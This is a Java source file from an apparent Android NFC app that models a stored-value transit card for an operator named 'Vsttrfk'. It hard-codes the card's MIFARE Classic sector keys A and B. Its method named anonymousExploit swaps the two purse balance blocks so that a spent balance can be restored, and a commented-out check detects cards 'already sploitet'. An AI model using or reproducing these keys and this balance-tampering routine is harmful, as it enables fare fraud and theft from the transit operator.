package com.vsttrfk.git64.cards;

import java.io.IOException;

import android.nfc.TagLostException;

import com.vsttrfk.git64.tools.BlockId;
import com.vsttrfk.git64.tools.Util;

public class VsttrfkCard extends AbstractRKFCard {
	public static final byte[][] KEYS_A_VSTTRFK = {
			{ (byte) 0xfc, (byte) 0x00, (byte) 0x01, (byte) 0x87, (byte) 0x78,
					(byte) 0xF7 },
			{ (byte) 0x02, (byte) 0x97, (byte) 0x92, (byte) 0x7C, (byte) 0x0F,
					(byte) 0x77 },
			{ (byte) 0x54, (byte) 0x72, (byte) 0x61, (byte) 0x76, (byte) 0x65,
					(byte) 0x6C } };
	public static final byte[][] KEYS_B_VSTTRFK = {
			{ (byte) 0x00, (byte) 0x00, (byte) 0x0F, (byte) 0xFE, (byte) 0x24,
					(byte) 0x88 },
			{ (byte) 0xEE, (byte) 0x00, (byte) 0x42, (byte) 0xF8, (byte) 0x88,
					(byte) 0x40 },
			{ (byte) 0x77, (byte) 0x69, (byte) 0x74, (byte) 0x68, (byte) 0x75,
					(byte) 0x73 } };

	/**
	 * Create card object from nfc-source
	 * 
	 * @param mfc
	 */
	public VsttrfkCard(byte[][] data) throws TagLostException, IOException {
		super(data);
	}

	public VsttrfkCard() {
		super();
	}

	public String getProvider() {
		return "Vsttrfk";
	}

	public boolean anonymousExploit() {
		final int i = getBlock(BlockId.PURSE);
		// if (Util.toHexString(data[8][3]).charAt(1) == '8'
		// && data[i + 1][0] > data[i + 2][0]) {
		// return false; // Card was already sploitet.
		// }

		// switch places between the two balance blocks.
		final byte[] temp = data[i + 1];
		data[i + 1] = data[i + 2];
		data[i + 2] = temp;

		return true;
	}

	protected int getBalanceBlock() {
		final int i = getBlock(BlockId.PURSE);
		final String blockSelect = Util.toHexString(data[8][3]);
		int result = 0;
		if (blockSelect.charAt(1) == '8') {
			result = i + 2;
		}
		if (blockSelect.charAt(1) == '4') {
			result = i + 1;
		}

		return result;
	}

	public byte[][] getKeysA() {
		return KEYS_A_VSTTRFK;
	}

	public byte[][] getKeysB() {
		return KEYS_B_VSTTRFK;
	}
}
